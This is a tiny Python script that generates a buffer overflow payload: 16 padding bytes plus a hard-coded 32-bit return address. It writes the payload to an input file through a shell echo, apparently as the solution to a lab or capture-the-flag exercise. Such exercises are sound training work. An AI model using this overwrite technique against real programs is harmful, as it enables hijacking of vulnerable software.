import os

a = "A"*16 + "\x9a\x92\x04\x08" 

os.system(f"echo '{a}'>method2input.txt")